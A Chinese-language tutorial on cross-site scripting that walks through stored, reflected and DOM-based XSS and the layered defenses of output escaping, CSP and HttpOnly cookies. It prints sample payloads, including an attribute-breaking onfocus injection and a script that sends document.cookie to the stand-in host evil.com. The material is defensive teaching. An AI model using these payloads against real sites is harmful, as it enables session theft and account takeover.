XSS（跨站脚本攻击）

一句话本质
XSS 是用户输入被浏览器当作代码执行，靠输出转义+CSP+HttpOnly 三层纵深防御。

第一幕：问题感知

你登录了银行网站，页面右上角显示"欢迎，张三"。你查了余额，转了笔账，关掉浏览器，一切正常。

第二天，你发现账户里少了五万块。

银行日志显示：昨晚 11 点，有人用你的身份发起了一笔转账。IP 地址不是你的，但登录凭证——那串证明"我是张三"的 Cookie——完全正确。

你没有把密码告诉任何人。Cookie 存在浏览器里，别的网站读不到。那这串 Cookie 是怎么泄露的？

回忆一下昨天的操作：你在银行网站的"留言板"看了一条留言，内容看起来很普通。但你不知道的是，那条留言里藏着一段代码。浏览器打开留言页时，把那段代码当成了网页自身的程序来执行。

这就奇怪了——留言板应该只显示文字，为什么浏览器会执行里面的代码？

你大概会想：那就把用户输入当纯文字处理，不让它变成代码。但问题是，网页本身就是由文字和代码混在一起写成的。浏览器怎么区分"这段是网页作者写的代码"和"这段是用户输入的文字"？

生活中有没有类似的困境：一份文件里既有"指令"又有"内容"，有人在内容里混入指令，执行者分不清？

用户输入混成了代码？

第二幕：引导式构建

先看看网页到底长什么样。浏览器收到的是一份 HTML 文档，里面文字和指令混写：

<p>用户留言：你好世界</p>

<p> 和 </p> 是指令（标签），告诉浏览器"这是一个段落"；中间的"用户留言：你好世界"是内容。浏览器靠尖括号 <> 来区分指令和内容。

现在，留言板的工作方式是：服务器把用户输入的文字，直接拼接进 HTML 模板里：

<p>用户留言：{用户输入的内容}</p>

如果用户输入"你好世界"，生成的 HTML 是 <p>用户留言：你好世界</p>，浏览器老老实实显示文字，没问题。

但如果用户输入的是这个呢？

<script>alert('嘿嘿')</script>

拼接后的 HTML 变成：

<p>用户留言：<script>alert('嘿嘿')</script></p>

浏览器看到 <script>——这是指令！于是它执行了里面的代码。一个弹窗跳出来。

这就是 XSS（Cross-Site Scripting，跨站脚本攻击） 的核心：攻击者的输入里包含尖括号和脚本标签，浏览器无法区分"这是网页原有的指令"还是"这是用户混进来的假指令"，于是照单全收。

想一想
如果你是浏览器，你收到一段 HTML，里面有 <script>...</script>，你有没有办法判断这段脚本是网站开发者写的，还是某个用户注入的？

答案是：没有。浏览器只看最终的 HTML 文档，它不知道哪部分来自模板、哪部分来自用户输入。到它手里时，一切都已经混在一起了。

弹窗只是演示。攻击者真正想做的，是偷你的 Cookie。

Cookie 是浏览器替你保管的一小段文字，里面存着你的登录凭证。每次你访问银行网站，浏览器自动把 Cookie 附上，服务器看到 Cookie 就知道"这是张三"。

在网页的脚本里，读 Cookie 只需要一行代码：document.cookie。所以攻击者注入的不是弹窗，而是：

<script>
  new Image().src = "https://evil.com/steal?c=" + document.cookie;
</script>

这段代码做了什么？它创建了一个图片请求，把你的 Cookie 拼进 URL 里，发送到攻击者的服务器。浏览器以为在加载图片，实际上你的登录凭证已经被偷走了。攻击者拿到 Cookie，粘贴到自己的浏览器里，就能以"张三"的身份登录银行。

想一想
为什么用"加载图片"的方式发送数据？如果攻击者直接用 fetch("https://evil.com/...") 发请求，会有什么不同吗？（提示：浏览器对跨域请求有限制，但加载图片是不受限的——任何网页都可以显示任何地址的图片。这是一个巧妙的绕过。）

现在问题清楚了：用户输入混进了 HTML，变成了代码。怎么防？

最直觉的想法：既然问题出在尖括号，那就不让尖括号出现。 把用户输入里的 < 替换成 &lt;，把 > 替换成 &gt;。

&lt; 是 HTML 的转义序列（Escape Sequence）——浏览器看到它，会显示一个字面的 < 符号，但不会把它当成标签的开头。

替换之后，攻击者的输入变成了：

<p>用户留言：&lt;script&gt;alert('嘿嘿')&lt;/script&gt;</p>

浏览器显示的是纯文字 <script>alert('嘿嘿')</script>，不会执行。指令和内容的边界被守住了。

这个方法叫做输出转义（Output Encoding / Escaping）——不是在用户输入时过滤，而是在输出到 HTML 时把危险字符转成无害的转义序列。

想一想
为什么强调"输出时"转义，而不是"输入时"过滤掉尖括号？如果用户确实想在留言里讨论 HTML 代码（比如在技术论坛里贴代码片段），输入时过滤会造成什么问题？

输入时过滤会破坏用户的合法内容。"输出时转义"则两全其美：数据库里存原始输入，只在渲染成 HTML 的那一刻做转义。

问题解决了？没有。

输出转义能防住"用户输入被拼进 HTML 标签之间"的情况。但网页不只有标签——还有属性。

比如一个搜索框，搜索词会回显在页面上：

<input type="text" value="{用户输入的搜索词}">

如果用户输入的是：

" onfocus="alert('嘿嘿')

拼接后变成：

<input type="text" value="" onfocus="alert('嘿嘿')">

没有任何 <script> 标签，也没有尖括号。但 onfocus 是一个事件属性（Event Handler）——当输入框获得焦点时，浏览器会执行里面的代码。

攻击者绕过了尖括号转义！因为这次攻击的注入点不在"标签之间"，而在"属性值里面"。在属性值里，危险字符不是 <>，而是引号 "——它能提前关闭属性值，插入新属性。

所以输出转义不能只替换尖括号。必须根据输出的上下文转义不同的字符：

上下文 危险字符 转义方式
HTML 标签之间 < > & " &lt; &gt; &amp; &quot;
HTML 属性值内 " ' & &quot; &#x27; &amp;
JavaScript 字符串内 ' " \ / \x27 \x22 \\ \/
URL 参数内 非字母数字 %XX 百分号编码

想一想
为什么同一个字符（比如引号 "）在不同上下文里需要不同的转义方式？用一种"万能转义"统一处理所有情况，行不行？

不行。每种上下文有自己的解析规则——HTML 解析器、JS 解析器、URL 解析器各管各的。&quot; 只有 HTML 解析器认识，放进 JavaScript 字符串里就是六个普通字符，毫无防御效果。

上下文转义解决了输出端的问题。但还有一个根本性的困境：你能保证每一个输出点都正确转义了吗？

一个大型网站可能有成千上万个地方把数据嵌入 HTML。漏掉一个，就是一个 XSS 漏洞。这是一场不对称战争——防御者需要堵住所有洞，攻击者只需要找到一个。

有没有一种方式，不依赖"每个输出点都做对"，而是从全局兜底？

浏览器其实提供了这样一个机制：CSP（Content Security Policy，内容安全策略）。

CSP 的思路完全不同。它不在输出点做文章，而是让服务器提前告诉浏览器：这个页面允许执行哪些脚本，不允许执行哪些。具体方式是服务器在 HTTP 响应头里加一行声明：

Content-Security-Policy: script-src 'self'

这句话的意思是：只执行来自本站域名的脚本文件。任何内联脚本（直接写在 HTML 里的 <script>...</script>）、任何外部域名的脚本，统统拒绝执行。

攻击者注入的代码几乎都是内联脚本。CSP 开启后，即使 HTML 里出现了注入的 <script>alert('嘿嘿')</script>，浏览器看到它不在允许名单里，直接忽略，不执行。

想一想
CSP 是不是万能的？如果攻击者的注入代码不是内联脚本，而是引用了本站自身的一个合法 JS 文件（比如 <script src="/js/analytics.js"></script>），CSP 的 script-src 'self' 能拦住吗？

拦不住——因为它确实来自本站域名。这就是为什么更严格的 CSP 用 nonce（随机数） 或 hash 来精确标记每个合法脚本，而不仅仅靠域名。

我们现在有了两层防御：输出转义（堵注入点）+ CSP（拦执行端）。但 Cookie 被偷这件事——还有没有更直接的办法？

回顾一下攻击链：注入脚本 → 脚本读取 document.cookie → 发送到攻击者服务器。

如果脚本根本读不到 Cookie 呢？

HTTP 协议提供了一个 Cookie 属性：HttpOnly。设置了 HttpOnly 的 Cookie，浏览器会正常发送给服务器，但 JavaScript 代码无法通过 document.cookie 读取它。

Set-Cookie: session=abc123; HttpOnly; Secure

这样即使 XSS 攻击成功、脚本跑起来了，它执行 document.cookie 得到的是空的——拿不到会话 Cookie。

想一想
HttpOnly 阻止了"偷 Cookie"这条路。但 XSS 注入的脚本还在受害者的浏览器里运行着，它还能做什么坏事？（提示：脚本可以修改页面内容、发起请求……）

脚本仍然可以：篡改页面显示虚假信息、代替用户发起转账请求、记录键盘输入窃取密码。HttpOnly 只断了"偷 Cookie"一条路，不是终极方案。

最后一个关键区分。到目前为止，我们讨论的都是"攻击者把恶意代码存到服务器上，其他用户访问时触发"——留言板就是这个场景。但 XSS 还有另一种形态。

假设搜索页面直接把 URL 里的参数回显到页面上：

https://bank.com/search?q=<script>alert(1)</script>

服务器没有存储任何东西，但如果它把 q 参数的值直接拼进了 HTML 返回给浏览器，脚本照样执行。

攻击者只需要把这个精心构造的 URL 发给受害者（通过钓鱼邮件、聊天链接），受害者一点击就中招。

这就是 XSS 的两大类型：

存储型 XSS（Stored XSS）：恶意代码被存到服务器（数据库），每个访问该页面的用户都会触发。留言板、评论区、个人资料页是高危区域。影响面大，一次注入、反复触发。

反射型 XSS（Reflected XSS）：恶意代码在 URL 参数里，服务器原样"反射"回页面。需要诱骗受害者点击特定链接。一次一个受害者，但攻击更隐蔽。

想一想
从防御角度看，存储型和反射型的防御手段有区别吗？输出转义和 CSP 对这两种类型是否同样有效？

防御手段完全一样——关键都在输出环节。不管恶意代码是从数据库读出来的，还是从 URL 参数传进来的，只要输出时正确转义，就不会被执行。CSP 也同样对两者生效。

端到端示例：一个留言板网站，用户可以发留言，其他人可以看到。

攻击过程（无防御时）：

第一步，攻击者在留言框输入：

<script>new Image().src="https://evil.com/s?c="+document.cookie</script>

第二步，服务器存入数据库，原样保存。

第三步，受害者张三访问留言页。服务器从数据库取出留言，拼接 HTML：

<div class="comment"><script>new Image().src="https://evil.com/s?c="+document.cookie</script></div>

第四步，浏览器解析 HTML，遇到 <script> 标签，执行脚本。张三的 Cookie session=abc123 被发送到 evil.com。

第五步，攻击者用 session=abc123 冒充张三登录。

防御后：

  • 输出转义：服务器输出时把 < 转成 &lt;。HTML 变成 &lt;script&gt;...&lt;/script&gt;，浏览器显示纯文字，不执行。攻击在第三步被阻断。
  • CSP：响应头包含 script-src 'self'。即使转义漏了，浏览器拒绝执行内联脚本。攻击在第四步被阻断。
  • HttpOnly：Cookie 设置了 HttpOnly。即使脚本跑起来了，document.cookie 返回空。攻击在第四步末尾被阻断（Cookie 读不出来）。

三层防御，任何一层生效，攻击链就断了。

第四幕：验证与压力测试

反事实 1：如果去掉输出转义？
只靠 CSP 和 HttpOnly。CSP 的 script-src 'self' 能挡住内联脚本，但如果攻击者找到一个本站的合法脚本文件可以被利用（比如 JSONP 端点），就能绕过 CSP。输出转义是最基础的防线，去掉它等于赌后面的层永远不出错。

反事实 2：如果去掉 CSP？
依赖每个输出点都正确转义。大型项目里漏掉一个输出点的概率不是零——CSP 就是为这种"万一漏了"准备的全局兜底。

反事实 3：如果去掉 HttpOnly？
输出转义 + CSP 双层防护下，脚本大概率不会执行。但防御的哲学是纵深防御（Defense in Depth）——每一层都假设其他层可能失败。HttpOnly 是最后一道门。

边界：XSS 在什么条件下防御失效？

  • 前端框架直接操作 DOM（如 innerHTML = userInput），绕过了模板引擎的自动转义
  • CSP 配置过于宽松（如 script-src 'unsafe-inline'），等于没开
  • DOM 型 XSS（DOM-based XSS）：恶意代码不经过服务器，纯在客户端 JavaScript 里拼接——服务端转义完全看不到它。这是第三种 XSS 类型，防御需要在前端代码里同样做输出转义
  • 富文本场景（允许用户输入 HTML）下，转义会破坏合法内容，需要用 HTML 净化器（Sanitizer）做白名单过滤

连接：XSS 和 SQL 注入的关系？
完全相同的本质：输入和指令混在同一个通道里，解析器分不清边界。SQL 注入是用户输入混进了 SQL 查询语句；XSS 是用户输入混进了 HTML/JS 代码。防御思路也相同——参数化/转义，让"数据永远是数据，指令永远是指令"。

连接：XSS 和 CSRF 的关系？
CSRF 的防御通常靠 CSRF Token——一个隐藏在表单里的随机值，攻击者猜不到。但如果存在 XSS 漏洞，攻击者的脚本在页面内执行，可以直接读取页面上的 CSRF Token，然后带着 Token 发起请求。所以 XSS 是 CSRF 防御的天敌——有 XSS，CSRF Token 形同虚设。

相关原子概念
CSRF · SQL注入 · SSRF · JWT · OIDC

XSS 和 SQL注入 是同一个"注入"本质的不同投影：SQL 注入注入 SQL，XSS 注入 HTML/JS，统一防御原则是在边界上将数据和指令分离。XSS 是 CSRF 防御的天敌——XSS 可以读取 CSRF Token，使 CSRF 防御失效。JWT 存在 localStorage 时可被 XSS 窃取。SSRF 是注入攻击的第三种投影——注入的是 URL/协议。OIDC 的身份层安全与 XSS 结合可能导致身份盗用。
